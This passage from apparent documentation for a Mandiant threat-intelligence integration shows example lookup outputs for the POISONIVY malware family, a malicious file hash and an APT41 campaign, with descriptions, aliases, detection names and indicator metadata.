                    "Chemicals & Materials",
                    "Civil Society & Non-Profits",
                    "Construction & Engineering",
                    "Energy & Utilities",
                    "Financial Services",
                    "Governments",
                    "Healthcare",
                    "Hospitality",
                    "Legal & Professional Services",
                    "Manufacturing",
                    "Media & Entertainment",
                    "Oil & Gas",
                    "Pharmaceuticals",
                    "Retail",
                    "Technology",
                    "Telecommunications",
                    "Transportation"
                ],
                "trafficlightprotocol": "AMBER",
                "updateddate": "2023-03-06T02:29:14.000Z",
                "yara": [
                    [
                        "FE_PoisonIVY_Stealer_Toolkit",
                        "signature--84b13cca-37e8-5c95-9471-b63dcaeb6df0"
                    ],
                    [
                        "FE_APT_Backdoor_Win32_POISONIVY_1",
                        "signature--22f52a69-ccc0-5763-bae7-c488ea856dae"
                    ]
                ]
            },
            "rawJSON": {
                "actors": [
                    {
                        "country_name": "China",
                        "id": "threat-actor--0ac5c1db-8ad6-54b8-b4b9-c32fc738c54a",
                        "iso2": "CN",
                        "last_updated": "2023-02-23T14:17:35Z",
                        "name": "APT1"
                    },
                    {
                        "country_name": "China",
                        "id": "threat-actor--bf9da649-f617-5464-9442-93e69cb80aa9",
                        "iso2": "CN",
                        "last_updated": "2023-01-28T06:02:22Z",
                        "name": "APT10"
                    }
                ],
                "aliases": [
                    {
                        "name": "Pivnoxy (Fortinet)"
                    },
                    {
                        "name": "PIVY (LAC)"
                    }
                ],
                "audience": [
                    {
                        "license": "INTEL_RBI_FUS",
                        "name": "intel_fusion"
                    },
                    {
                        "license": "INTEL_RBI_OPS",
                        "name": "intel_oper"
                    },
                    {
                        "license": "amber",
                        "name": "tlp_marking"
                    }
                ],
                "capabilities": [
                    {
                        "description": "Capable of performing raw access to physical disks.",
                        "name": "Access raw disk"
                    },
                    {
                        "description": "Capable of allocating memory. ",
                        "name": "Allocates memory"
                    }
                ],
                "counts": {
                    "actors": 27,
                    "aliases": 14,
                    "attack_patterns": 68,
                    "capabilities": 42,
                    "cve": 11,
                    "detections": 16,
                    "industries": 20,
                    "malware": 21,
                    "reports": 25
                },
                "cve": [
                    {
                        "cve_id": "CVE-2012-0158",
                        "id": "vulnerability--e0b130b7-1772-5c4d-891c-9c48eb1a5a23"
                    },
                    {
                        "cve_id": "CVE-2015-2545",
                        "id": "vulnerability--74c54fd3-dbc9-5273-88c6-b47975fca9b6"
                    }
                ],
                "description": "POISONIVY is a backdoor that exists as shellcode and communicates via a custom binary protocol over TCP. Additional shellcode plugins are downloaded, mapped directly into memory, and executed. Observed plugin functionality includes reverse shell, keylogging, video capture, audio capture, and registry manipulation. POISONIVY is configured, built, and controlled using a publicly available management interface. The interface produces the shellcode that must be included in, or executed by, a separate application.",
                "detections": [
                    "APT.Backdoor.Win.POISONIVY",
                    "POISON IVY (VARIANT)",
                    "FE_PoisonIVY_Stealer_Toolkit",
                    "FE_APT_Backdoor_Win32_POISONIVY_1",
                    "ET INFO SUSPICIOUS Dotted Quad Host MZ Response (ET OPEN)",
                    "ET POLICY PE EXE or DLL Windows file download HTTP (ET OPEN)",
                    "Backdoor.Win32.Poison.FEC2 (Trellix)",
                    "Trojan.APT.PoisonIvy",
                    "Win.Dropper.Zusy-9801038-0 (ClamAV)",
                    "Backdoor.APT.PoisonIvy",
                    "Win.Malware.Loader-9834612-0 (ClamAV)",
                    "Backdoor.Poison",
                    "Backdoor.Win.PI.FEC2 (Trellix)",
                    "Trojan.Poison",
                    "Trojan.PoisonIvy.DNS",
                    "Win.Trojan.PoisonIvy-9755171-0 (ClamAV)"
                ],
                "id": "malware--c14087e2-91dc-5a4c-a820-5eaa86ba4c99",
                "industries": [
                    {
                        "id": "identity--cc593632-0c42-500c-8d0b-d38e97b90f1d",
                        "name": "Aerospace & Defense"
                    },
                    {
                        "id": "identity--cd044760-0aef-557e-94c4-bc672ea177c2",
                        "name": "Agriculture"
                    }
                ],
                "inherently_malicious": 1,
                "is_publishable": true,
                "last_activity_time": "2023-03-06T02:29:14.000Z",
                "last_updated": "2023-03-06T02:29:14.000Z",
                "malware": [
                    {
                        "id": "malware--709f2440-b4fa-5017-991e-b4a5b22b5fd9",
                        "name": "CRABREST"
                    },
                    {
                        "id": "malware--6e812e51-feb9-54fb-8372-8e38aaead41d",
                        "name": "EASYCHAIR"
                    }
                ],
                "name": "POISONIVY",
                "operating_systems": [
                    "Windows"
                ],
                "roles": [
                    "Backdoor"
                ],
                "type": "malware",
                "yara": [
                    {
                        "id": "signature--84b13cca-37e8-5c95-9471-b63dcaeb6df0",
                        "name": "FE_PoisonIVY_Stealer_Toolkit"
                    },
                    {
                        "id": "signature--22f52a69-ccc0-5763-bae7-c488ea856dae",
                        "name": "FE_APT_Backdoor_Win32_POISONIVY_1"
                    }
                ]
            },
            "relationships": [
                {
                    "entityA": "POISONIVY",
                    "entityAFamily": "Indicator",
                    "entityAType": "Malware",
                    "entityB": "APT1",
                    "entityBFamily": "Indicator",
                    "entityBType": "Threat Actor",
                    "fields": {},
                    "name": "related-to",
                    "reverseName": "related-to",
                    "type": "IndicatorToIndicator"
                },
                {
                    "entityA": "POISONIVY",
                    "entityAFamily": "Indicator",
                    "entityAType": "Malware",
                    "entityB": "APT10",
                    "entityBFamily": "Indicator",
                    "entityBType": "Threat Actor",
                    "fields": {},
                    "name": "related-to",
                    "reverseName": "related-to",
                    "type": "IndicatorToIndicator"
                }
            ],
            "score": 0,
            "type": "Malware",
            "value": "POISONIVY"
        }
    }
}
```

#### Human Readable Output

>### Results
>|fields|rawJSON|relationships|score|type|value|
>|---|---|---|---|---|---|
>| operatingsystemrefs: Windows<br/>aliases: Pivnoxy (Fortinet),<br/>PIVY (LAC),<br/>Pivy (Palo Alto Networks),<br/>Pivydwnldr,<br/>Poison Ivy,<br/>Poison Ivy (JPCERT),<br/>Poison Ivy (Proofpoint),<br/>Poison Ivy (Symantec),<br/>PoisonIvy,<br/>Poisonivy (Check Point),<br/>Poisonivy (Recorded Future),<br/>Royal Road (Anomali),<br/>Royal Road (Internet),<br/>Spivy (Palo Alto Networks)<br/>capabilities: {'name': 'Access raw disk', 'description': 'Capable of performing raw access to physical disks.'},<br/>{'name': 'Allocates memory', 'description': 'Capable of allocating memory. '},<br/>{'name': 'Capture operating system information', 'description': 'Can capture information about the system OS configuration.'}<br/>tags: Aerospace & Defense,<br/>Agriculture,<br/>Automotive,<br/>Chemicals & Materials,<br/>Civil Society & Non-Profits,<br/>Construction & Engineering,<br/>Energy & Utilities,<br/>Financial Services,<br/>Governments,<br/>Healthcare,<br/>Hospitality,<br/>Legal & Professional Services,<br/>Manufacturing,<br/>Media & Entertainment,<br/>Oil & Gas,<br/>Pharmaceuticals,<br/>Retail,<br/>Technology,<br/>Telecommunications,<br/>Transportation<br/>mandiantdetections: APT.Backdoor.Win.POISONIVY,<br/>POISON IVY (VARIANT),<br/>FE_PoisonIVY_Stealer_Toolkit,<br/>FE_APT_Backdoor_Win32_POISONIVY_1,<br/>ET INFO SUSPICIOUS Dotted Quad Host MZ Response (ET OPEN),<br/>ET POLICY PE EXE or DLL Windows file download HTTP (ET OPEN),<br/>Backdoor.Win32.Poison.FEC2 (Trellix),<br/>Trojan.APT.PoisonIvy,<br/>Win.Dropper.Zusy-9801038-0 (ClamAV),<br/>Backdoor.APT.PoisonIvy,<br/>Win.Malware.Loader-9834612-0 (ClamAV),<br/>Backdoor.Poison,<br/>Backdoor.Win.PI.FEC2 (Trellix),<br/>Trojan.Poison,<br/>Trojan.PoisonIvy.DNS,<br/>Win.Trojan.PoisonIvy-9755171-0 (ClamAV)<br/>yara: ('FE_PoisonIVY_Stealer_Toolkit', 'signature--84b13cca-37e8-5c95-9471-b63dcaeb6df0'),<br/>('FE_APT_Backdoor_Win32_POISONIVY_1', 'signature--22f52a69-ccc0-5763-bae7-c488ea856dae')<br/>roles: Backdoor<br/>stixid: malware--c14087e2-91dc-5a4c-a820-5eaa86ba4c99<br/>name: {"POISONIVY": "[POISONIVY](#/indicator/5559)"}<br/>description: POISONIVY is a backdoor that exists as shellcode and communicates via a custom binary protocol over TCP. Additional shellcode plugins are downloaded, mapped directly into memory, and executed. Observed plugin functionality includes reverse shell, keylogging, video capture, audio capture, and registry manipulation. POISONIVY is configured, built, and controlled using a publicly available management interface. The interface produces the shellcode that must be included in, or executed by, a separate application.<br/>updateddate: 2023-03-06T02:29:14.000Z<br/>lastseenbysource: 2023-03-06T02:29:14.000Z<br/>trafficlightprotocol: AMBER<br/>Is Malware Family: true<br/>DBot Score: {"Indicator": null, "Type": "Malware", "Vendor": "Mandiant", "Score": 0, "Reliability": "A - Completely reliable"}<br/>publications: {'source': 'Mandiant', 'title': 'Country Profile: India (2022)', 'link': 'https:<span>//</span>advantage.mandiant.com/reports/22-00022357', 'timestamp': 1668046325.0},<br/>{'source': 'Mandiant', 'title': 'Supply Chain Compromise Trends, 2019–2020', 'link': 'https:<span>//</span>advantage.mandiant.com/reports/21-00010407', 'timestamp': 1648063696.0} | actors: {'id': 'threat-actor--0ac5c1db-8ad6-54b8-b4b9-c32fc738c54a', 'name': 'APT1', 'country_name': 'China', 'iso2': 'CN', 'last_updated': '2023-02-23T14:17:35Z'},<br/>{'id': 'threat-actor--bf9da649-f617-5464-9442-93e69cb80aa9', 'name': 'APT10', 'country_name': 'China', 'iso2': 'CN', 'last_updated': '2023-01-28T06:02:22Z'}<br/>audience: {'name': 'intel_fusion', 'license': 'INTEL_RBI_FUS'},<br/>{'name': 'intel_oper', 'license': 'INTEL_RBI_OPS'},<br/>{'name': 'tlp_marking', 'license': 'amber'}<br/>description: POISONIVY is a backdoor that exists as shellcode and communicates via a custom binary protocol over TCP. Additional shellcode plugins are downloaded, mapped directly into memory, and executed. Observed plugin functionality includes reverse shell, keylogging, video capture, audio capture, and registry manipulation. POISONIVY is configured, built, and controlled using a publicly available management interface. The interface produces the shellcode that must be included in, or executed by, a separate application.<br/>detections: APT.Backdoor.Win.POISONIVY,<br/>POISON IVY (VARIANT),<br/>FE_PoisonIVY_Stealer_Toolkit,<br/>FE_APT_Backdoor_Win32_POISONIVY_1,<br/>ET INFO SUSPICIOUS Dotted Quad Host MZ Response (ET OPEN),<br/>ET POLICY PE EXE or DLL Windows file download HTTP (ET OPEN),<br/>Backdoor.Win32.Poison.FEC2 (Trellix),<br/>Trojan.APT.PoisonIvy,<br/>Win.Dropper.Zusy-9801038-0 (ClamAV),<br/>Backdoor.APT.PoisonIvy,<br/>Win.Malware.Loader-9834612-0 (ClamAV),<br/>Backdoor.Poison,<br/>Backdoor.Win.PI.FEC2 (Trellix),<br/>Trojan.Poison,<br/>Trojan.PoisonIvy.DNS,<br/>Win.Trojan.PoisonIvy-9755171-0 (ClamAV)<br/>id: malware--c14087e2-91dc-5a4c-a820-5eaa86ba4c99<br/>industries: {'id': 'identity--cc593632-0c42-500c-8d0b-d38e97b90f1d', 'name': 'Aerospace & Defense'},<br/>{'id': 'identity--cd044760-0aef-557e-94c4-bc672ea177c2', 'name': 'Agriculture'}<br/>inherently_malicious: 1<br/>last_activity_time: 2023-03-06T02:29:14.000Z<br/>last_updated: 2023-03-06T02:29:14.000Z<br/>malware: {'id': 'malware--709f2440-b4fa-5017-991e-b4a5b22b5fd9', 'name': 'CRABREST'},<br/>{'id': 'malware--6e812e51-feb9-54fb-8372-8e38aaead41d', 'name': 'EASYCHAIR'}<br/>name: POISONIVY<br/>operating_systems: Windows<br/>type: malware<br/>yara: {'id': 'signature--84b13cca-37e8-5c95-9471-b63dcaeb6df0', 'name': 'FE_PoisonIVY_Stealer_Toolkit'},<br/>{'id': 'signature--22f52a69-ccc0-5763-bae7-c488ea856dae', 'name': 'FE_APT_Backdoor_Win32_POISONIVY_1'}<br/>is_publishable: true<br/>counts: {"reports": 25, "capabilities": 42, "malware": 21, "actors": 27, "detections": 16, "cve": 11, "aliases": 14, "industries": 20, "attack_patterns": 68}<br/>aliases: {'name': 'Pivnoxy (Fortinet)'},<br/>{'name': 'PIVY (LAC)'}<br/>capabilities: {'name': 'Access raw disk', 'description': 'Capable of performing raw access to physical disks.'},<br/>{'name': 'Allocates memory', 'description': 'Capable of allocating memory. '}<br/>cve: {'id': 'vulnerability--e0b130b7-1772-5c4d-891c-9c48eb1a5a23', 'cve_id': 'CVE-2012-0158'},<br/>{'id': 'vulnerability--74c54fd3-dbc9-5273-88c6-b47975fca9b6', 'cve_id': 'CVE-2015-2545'},<br/>{'id': 'vulnerability--005f9d5c-0298-52ea-b7d4-003fb7729586', 'cve_id': 'CVE-2018-0798'}<br/>roles: Backdoor | {'name': 'related-to', 'reverseName': 'related-to', 'type': 'IndicatorToIndicator', 'entityA': 'POISONIVY', 'entityAFamily': 'Indicator', 'entityAType': 'Malware', 'entityB': 'APT1', 'entityBFamily': 'Indicator', 'entityBType': 'Threat Actor', 'fields': {}},<br/>{'name': 'related-to', 'reverseName': 'related-to', 'type': 'IndicatorToIndicator', 'entityA': 'POISONIVY', 'entityAFamily': 'Indicator', 'entityAType': 'Malware', 'entityB': 'APT10', 'entityBFamily': 'Indicator', 'entityBType': 'Threat Actor', 'fields': {}} | 0 | Malware | POISONIVY |


### file

***
Retrieve information about a File Hash from Mandiant

#### Base Command

`file`

#### Input

| **Argument Name** | **Description** | **Required** |
| --- | --- | --- |
| file | List of files. | Optional | 

#### Context Output

| **Path** | **Type** | **Description** |
| --- | --- | --- |
| MANDIANTTI.FILE.score | Number | The Severity Score of the File indicator | 
| MANDIANTTI.FILE.fields.md5 | String | The MD5 Hash associated with the File indicator | 
| MANDIANTTI.FILE.fields.sha256 | String | The SHA256 Hash associated with the File indicator | 
| MANDIANTTI.FILE.fields.sha1 | String | The SHA1 Hash associated with the File indicator | 

#### Command example
```!file file=9c944bd7a0af0ebd8a52f16d2e09f4ae```
#### Context Example
```json
{
    "MANDIANTTI": {
        "FILE": [
            {
                "fields": {
                    "DBotScore": {
                        "Indicator": "9c944bd7a0af0ebd8a52f16d2e09f4ae",
                        "Reliability": "A - Completely reliable",
                        "Score": 3,
                        "Type": "file",
                        "Vendor": "Mandiant"
                    },
                    "firstseenbysource": "2016-06-09T16:27:25.000Z",
                    "lastseenbysource": "2016-06-09T16:27:25.000Z",
                    "md5": "9c944bd7a0af0ebd8a52f16d2e09f4ae",
                    "sha1": "03b89c5e964113cb25bf6581d35ca3db97692ae2",
                    "sha256": "74bb66638683a1a3b6b64d4b90b7979f60e9269418fc07b17eacfd3324688a5e",
                    "stixid": "md5--381c455d-58ba-51e0-89fa-74534671c9fc",
                    "trafficlightprotocol": "AMBER"
                },
                "rawJSON": {
                    "associated_hashes": [
                        {
                            "id": "md5--381c455d-58ba-51e0-89fa-74534671c9fc",
                            "type": "md5",
                            "value": "9c944bd7a0af0ebd8a52f16d2e09f4ae"
                        },
                        {
                            "id": "sha1--2d3d8372-ecef-50bb-947b-8c004c6489dc",
                            "type": "sha1",
                            "value": "03b89c5e964113cb25bf6581d35ca3db97692ae2"
                        },
                        {
                            "id": "sha256--55212b49-045d-5f74-a9c7-37907e016e6a",
                            "type": "sha256",
                            "value": "74bb66638683a1a3b6b64d4b90b7979f60e9269418fc07b17eacfd3324688a5e"
                        }
                    ],
                    "campaigns": [],
                    "first_seen": "2016-06-09T16:27:25.000Z",
                    "id": "md5--381c455d-58ba-51e0-89fa-74534671c9fc",
                    "is_publishable": true,
                    "last_seen": "2016-06-09T16:27:25.000Z",
                    "last_updated": "2022-02-21T02:46:13.698Z",
                    "mscore": 100,
                    "publications": [],
                    "sources": [
                        {
                            "category": [],
                            "first_seen": "2016-06-09T16:27:25.000+0000",
                            "last_seen": "2016-06-09T16:27:25.000+0000",
                            "osint": false,
                            "source_name": "Mandiant"
                        },
                        {
                            "category": [],
                            "first_seen": "2016-06-09T16:27:25.000+0000",
                            "last_seen": "2016-06-09T16:27:25.000+0000",
                            "osint": false,
                            "source_name": "Mandiant"
                        }
                    ],
                    "type": "md5",
                    "value": "9c944bd7a0af0ebd8a52f16d2e09f4ae"
                },
                "relationships": [],
                "score": 3,
                "type": "File",
                "value": "9c944bd7a0af0ebd8a52f16d2e09f4ae"
            }
        ]
    }
}
```

#### Human Readable Output

>### Results
>|fields|rawJSON|relationships|score|type|value|
>|---|---|---|---|---|---|
>| firstseenbysource: 2016-06-09T16:27:25.000Z<br/>lastseenbysource: 2016-06-09T16:27:25.000Z<br/>stixid: md5--381c455d-58ba-51e0-89fa-74534671c9fc<br/>trafficlightprotocol: AMBER<br/>DBotScore: {"Indicator": "9c944bd7a0af0ebd8a52f16d2e09f4ae", "Type": "file", "Vendor": "Mandiant", "Score": 3, "Reliability": "A - Completely reliable"}<br/>md5: 9c944bd7a0af0ebd8a52f16d2e09f4ae<br/>sha256: 74bb66638683a1a3b6b64d4b90b7979f60e9269418fc07b17eacfd3324688a5e<br/>sha1: 03b89c5e964113cb25bf6581d35ca3db97692ae2 | id: md5--381c455d-58ba-51e0-89fa-74534671c9fc<br/>mscore: 100<br/>type: md5<br/>value: 9c944bd7a0af0ebd8a52f16d2e09f4ae<br/>is_publishable: true<br/>sources: {'first_seen': '2016-06-09T16:27:25.000+0000', 'last_seen': '2016-06-09T16:27:25.000+0000', 'osint': False, 'category': [], 'source_name': 'Mandiant'},<br/>{'first_seen': '2016-06-09T16:27:25.000+0000', 'last_seen': '2016-06-09T16:27:25.000+0000', 'osint': False, 'category': [], 'source_name': 'Mandiant'}<br/>associated_hashes: {'id': 'md5--381c455d-58ba-51e0-89fa-74534671c9fc', 'type': 'md5', 'value': '9c944bd7a0af0ebd8a52f16d2e09f4ae'},<br/>{'id': 'sha1--2d3d8372-ecef-50bb-947b-8c004c6489dc', 'type': 'sha1', 'value': '03b89c5e964113cb25bf6581d35ca3db97692ae2'},<br/>{'id': 'sha256--55212b49-045d-5f74-a9c7-37907e016e6a', 'type': 'sha256', 'value': '74bb66638683a1a3b6b64d4b90b7979f60e9269418fc07b17eacfd3324688a5e'}<br/>misp: {"akamai": false, "alexa": false, "alexa_1M": false, "amazon-aws": false, "apple": false, "automated-malware-analysis": false, "bank-website": false, "cisco_1M": false, "cisco_top1000": false, "cisco_top10k": false, "cisco_top20k": false, "cisco_top5k": false, "cloudflare": false, "common-contact-emails": false, "common-ioc-false-positive": false, "covid": false, "covid-19-cyber-threat-coalition-whitelist": false, "covid-19-krassi-whitelist": false, "crl-hostname": false, "crl-ip": false, "dax30": false, "disposable-email": false, "dynamic-dns": false, "eicar.com": false, "empty-hashes": false, "fastly": false, "google": false, "google-gcp": false, "google-gmail-sending-ips": false, "googlebot": false, "ipv6-linklocal": false, "majestic_million": false, "majestic_million_1M": false, "microsoft": false, "microsoft-attack-simulator": false, "microsoft-azure": false, "microsoft-azure-china": false, "microsoft-azure-germany": false, "microsoft-azure-us-gov": false, "microsoft-office365": false, "microsoft-office365-cn": false, "microsoft-office365-ip": false, "microsoft-win10-connection-endpoints": false, "moz-top500": false, "mozilla-CA": false, "mozilla-IntermediateCA": false, "multicast": false, "nioc-filehash": false, "ovh-cluster": false, "phone_numbers": false, "public-dns-hostname": false, "public-dns-v4": false, "public-dns-v6": false, "rfc1918": false, "rfc3849": false, "rfc5735": false, "rfc6598": false, "rfc6761": false, "second-level-tlds": false, "security-provider-blogpost": false, "sinkholes": false, "smtp-receiving-ips": false, "smtp-sending-ips": false, "stackpath": false, "ti-falsepositives": false, "tlds": false, "tranco": false, "tranco10k": false, "university_domains": false, "url-shortener": false, "vpn-ipv4": false, "vpn-ipv6": false, "whats-my-ip": false, "wikimedia": false}<br/>last_updated: 2022-02-21T02:46:13.698Z<br/>first_seen: 2016-06-09T16:27:25.000Z<br/>last_seen: 2016-06-09T16:27:25.000Z<br/>campaigns: <br/>publications:  |  | 3 | File | 9c944bd7a0af0ebd8a52f16d2e09f4ae |


### ip

***
Retrieve information about an IP Address from Mandiant

#### Base Command

`ip`

#### Input

| **Argument Name** | **Description** | **Required** |
| --- | --- | --- |
| ip | List of IPs. | Optional | 

#### Context Output

| **Path** | **Type** | **Description** |
| --- | --- | --- |
| MANDIANTTI.IP.score | Number | The Severity Score of the IP indicator | 
| MANDIANTTI.IP.fields.ip | String | The IP address of the IP indicator | 

#### Command example
```!ip ip=124.248.207.50```
#### Context Example
```json
{
    "MANDIANTTI": {
        "Campaign": {
            "fields": {
                "DBot Score": {
                    "Indicator": null,
                    "Reliability": "A - Completely reliable",
                    "Score": 0,
                    "Type": "Campaign",
                    "Vendor": "Mandiant"
                },
                "actors": [
                    "APT41"
                ],
                "description": "In mid-October 2021, Mandiant observed a wave of APT41 activity targeting multiple U.S. state governments. We believe the actors exploited a vulnerability in a public-facing web application, used by numerous state governments and U.S. educational research institutes, to gain initial access. The actors then conducted reconnaissance and credential harvesting activity, dropping multiple files including the publicly available BADPOTATO privilege escalation tool. Mandiant also identified the DEADEYE dropper, which executed a KEYPLUG backdoor.  \n\nThis activity is likely a continuation of a previously observed APT41 campaign targeting multiple U.S. state government entities in May 2021. The specific motivation behind the targeting of U.S. state government entities remains unclear, though we infer, based on the targeting profile, that the purpose may include capturing political intelligence or data related to sensitive technologies with national or state-level applications. It is also possible that the capture of credentials can facilitate future targeting or pivoting to targets of interest.",
                "publications": [],
                "tags": [
                    "Governments"
                ]
            },
            "rawJSON": {
                "actors": [
                    {
                        "attribution_scope": "confirmed",
                        "id": "threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64",
                        "motivations": [
                            {
                                "attribution_scope": "confirmed",
                                "id": "motivation--fa4d4992-1762-50ac-b0b1-2c75210645d0",
                                "name": "Financial Gain",
                                "releasable": true,
                                "type": "motivation"
                            },
                            {
                                "attribution_scope": "confirmed",
                                "id": "motivation--1b8ca82a-7cff-5622-bedd-965c11d38a9e",
                                "name": "Espionage",
                                "releasable": true,
                                "type": "motivation"
                            }
                        ],
                        "name": "APT41",
                        "releasable": true,
                        "source_locations": [
                            {
                                "country": {
                                    "attribution_scope": "confirmed",
                                    "id": "location--740e7e5f-f2a0-55e0-98a3-88872c55b581",
                                    "iso2": "CN",
                                    "name": "China",
                                    "releasable": true,
                                    "type": "location"
                                },
                                "region": {
                                    "attribution_scope": "confirmed",
                                    "id": "location--8fc231f3-4e62-57e7-b734-eaee0a734612",
                                    "name": "Asia",
                                    "releasable": true,
                                    "type": "location"
                                },
                                "releasable": true,
                                "sub_region": {
                                    "attribution_scope": "confirmed",
                                    "id": "location--7b33370b-da4b-5c48-9741-b69f69febb77",
                                    "name": "East Asia",
                                    "releasable": true,
                                    "type": "location"
                                }
                            }
                        ],
                        "type": "threat-actor"
                    }
                ],
                "aliases": {
                    "actor": [
                        {
                            "attribution_scope": "confirmed",
                            "id": "alias--c63f2b2b-3639-5bd0-be28-b1cb79b00b21",
                            "name": "Barium (Microsoft)",
                            "nucleus_name": "Barium",
                            "releasable": true,
                            "source": "Microsoft",
                            "type": "alias"
                        }
                    ],
                    "campaign": [],
                    "malware": [],
                    "releasable": true
                },
                "audience": [
                    {
                        "license": "INTEL_RBI_OPS",
                        "name": "intel_oper"
                    },
                    {
                        "license": "INTEL_RBI_FUS",
                        "name": "intel_fusion"
                    },
                    {
                        "license": "amber",
                        "name": "tlp_marking"
                    }
                ],
                "campaign_type": "Individual",
                "counts": {
                    "actor_collaborations": 0,
                    "actors": 1,
                    "campaigns": 0,
                    "industries": 1,
                    "malware": 19,
                    "reports": 4,
                    "timeline": 104,
                    "tools": 9,
                    "vulnerabilities": 1
                },
                "description": "In mid-October 2021, Mandiant observed a wave of APT41 activity targeting multiple U.S. state governments. We believe the actors exploited a vulnerability in a public-facing web application, used by numerous state governments and U.S. educational research institutes, to gain initial access. The actors then conducted reconnaissance and credential harvesting activity, dropping multiple files including the publicly available BADPOTATO privilege escalation tool. Mandiant also identified the DEADEYE dropper, which executed a KEYPLUG backdoor.  \n\nThis activity is likely a continuation of a previously observed APT41 campaign targeting multiple U.S. state government entities in May 2021. The specific motivation behind the targeting of U.S. state government entities remains unclear, though we infer, based on the targeting profile, that the purpose may include capturing political intelligence or data related to sensitive technologies with national or state-level applications. It is also possible that the capture of credentials can facilitate future targeting or pivoting to targets of interest.",
                "id": "campaign--c344bb9b-cb50-58be-9c33-350b622c1fce",
                "industries": [
                    {
                        "attribution_scope": "confirmed",
                        "id": "identity--8d0881d8-d199-5e5a-bef9-be3ca6bb8f0d",
                        "name": "Governments",
                        "releasable": true,
                        "type": "identity"
                    }
                ],
                "is_publishable": true,
                "last_activity_time": "2022-02-26T00:00:00.000Z",
                "malware": [
                    {
                        "attribution_scope": "confirmed",
                        "id": "malware--448e822d-8496-5021-88cb-599062f74176",
                        "name": "BEACON",
                        "releasable": true,
                        "type": "malware"
                    },
                    {
                        "attribution_scope": "confirmed",
                        "id": "malware--ad51977a-c6fc-5cd3-822e-4e2aa6c832a2",
                        "name": "FASTPACE",
                        "releasable": true,
                        "type": "malware"
                    },
                    {
                        "attribution_scope": "confirmed",
                        "id": "malware--e62ff7e0-b076-53bb-9872-5888833df016",
                        "name": "KEYPLUG.PASSIVE",
                        "releasable": true,
                        "type": "malware"
                    },
                    {
                        "attribution_scope": "confirmed",
                        "id": "malware--cc16c574-c8ff-5873-8ee2-ca5fe841d86f",
                        "name": "LOWKEY.PASSIVE",
                        "releasable": true,
                        "type": "malware"
                    },
                    {
                        "attribution_scope": "confirmed",
                        "id": "malware--826fd422-6e98-5ea9-82c1-0cf54072658f",
                        "name": "DEADEYE.EMBED",
                        "releasable": true,
                        "type": "malware"
                    },
                    {
                        "attribution_scope": "confirmed",
                        "id": "malware--81b043a3-44c5-526a-af8c-b2730ba3bfbb",
                        "name": "DEADEYE.APPEND",
                        "releasable": true,
                        "type": "malware"
                    },
                    {
                        "attribution_scope": "confirmed",
                        "id": "malware--29ff2215-d745-5855-a3dd-3178121aac8a",
                        "name": "LOWKEY",
                        "releasable": true,
                        "type": "malware"
                    },
                    {
                        "attribution_scope": "confirmed",
                        "id": "malware--515cf8ae-3453-5eb6-a07b-a9f0fa586959",
                        "name": "TRAILBRAKE",
                        "releasable": true,
                        "type": "malware"
                    },
                    {
                        "attribution_scope": "confirmed",
                        "id": "malware--6732275a-d77a-50d8-84c3-d54c36a93d1b",
                        "name": "ICECOLD",
                        "releasable": true,
                        "type": "malware"
                    },
                    {
                        "attribution_scope": "confirmed",
                        "id": "malware--0514a150-7c5a-512f-bec2-8aa51cbcb8b1",
                        "name": "DEADEYE",
                        "releasable": true,
                        "type": "malware"
                    },
                    {
                        "attribution_scope": "confirmed",
                        "id": "malware--487dd1af-1763-5af3-878e-dc606dd71f6e",
                        "name": "KEYPLUG.LINUX",
                        "releasable": true,
                        "type": "malware"
                    },
                    {
                        "attribution_scope": "confirmed",
                        "id": "malware--440967f3-ca59-5708-837a-b6d0ae58a413",
                        "name": "JAYPOTATO",
                        "releasable": true,
                        "type": "malware"
                    },
                    {
                        "attribution_scope": "confirmed",
                        "id": "malware--8e99e597-dda4-57dc-be6e-f1bc8b80a5f3",
                        "name": "BADPOTATO",
                        "releasable": true,
                        "type": "malware"
                    },
                    {
                        "attribution_scope": "confirmed",
                        "id": "malware--81737f54-c8df-55cf-96c3-77aa373ab4c9",
                        "name": "SWEETSHOT",
                        "releasable": true,
                        "type": "malware"
                    },
                    {
                        "attribution_scope": "confirmed",
                        "id": "malware--e9eda095-4e8b-5c30-a5cd-a531b39a0a2f",
                        "name": "DUSTCOVER",
                        "releasable": true,
                        "type": "malware"
                    },
                    {
                        "attribution_scope": "confirmed",
                        "id": "malware--8c31abe5-7cb1-51f4-97d5-a14e0a95eccb",
                        "name": "KEYPLUG.LINUX.PASSIVE",
                        "releasable": true,
                        "type": "malware"
                    },
                    {
                        "attribution_scope": "confirmed",
                        "id": "malware--b0e965fb-1737-5c63-85c7-e90a323b1e27",
                        "name": "HTRAN",
                        "releasable": true,
                        "type": "malware"
                    },
                    {
                        "attribution_scope": "confirmed",
                        "id": "malware--13e9e1a1-5870-5caa-af40-26b9027df5ef",
                        "name": "DUSTPAN",
                        "releasable": true,
                        "type": "malware"
                    },
                    {
                        "attribution_scope": "confirmed",
                        "id": "malware--4484e24c-fbf7-5894-90e2-4c6ed949ec6c",
                        "name": "KEYPLUG",
                        "releasable": true,
                        "type": "malware"
                    }
                ],
                "name": "APT41 Exploition of .NET Web Applications at U.S. State Governments",
                "profile_updated": "2023-03-06T07:10:13.356Z",
                "releasable": true,
                "short_name": "CAMP.21.014",
                "target_locations": {
                    "countries": [
                        {
                            "attribution_scope": "confirmed",
                            "count": 8,
                            "id": "location--5c5b39aa-9308-52a6-9daf-0547d5aaa160",
                            "iso2": "US",
                            "name": "United States of America",
                            "region": "location--6d65522f-0166-5e7e-973c-35cf7973e4e3",
                            "releasable": true,
                            "sub_region": "location--0daadcfb-ad23-5f16-b53b-6c5b09bf20de",
                            "type": "location"
                        }
                    ],
                    "regions": [
                        {
                            "attribution_scope": "confirmed",
                            "count": 8,
                            "id": "location--6d65522f-0166-5e7e-973c-35cf7973e4e3",
                            "name": "Americas",
                            "releasable": true,
                            "type": "location"
                        }
                    ],
                    "releasable": true,
                    "sub_regions": [
                        {
                            "attribution_scope": "confirmed",
                            "count": 8,
                            "id": "location--0daadcfb-ad23-5f16-b53b-6c5b09bf20de",
                            "name": "North America",
                            "region": "location--6d65522f-0166-5e7e-973c-35cf7973e4e3",
                            "releasable": true,
                            "type": "location"
                        }
                    ]
                },
                "timeline": [
                    {
                        "description": "Mandiant Declared Campaign",
                        "event_type": "created",
                        "name": "Campaign Created",
                        "releasable": true,
                        "timestamp": "2021-10-18T00:00:00.000Z"
                    },
                    {
                        "description": "Mandiant Observed First Activity of Campaign",
                        "event_type": "first_observed",
                        "name": "First Observed",
                        "releasable": true,
                        "timestamp": "2020-06-15T00:00:00.000Z"
                    },
                    {
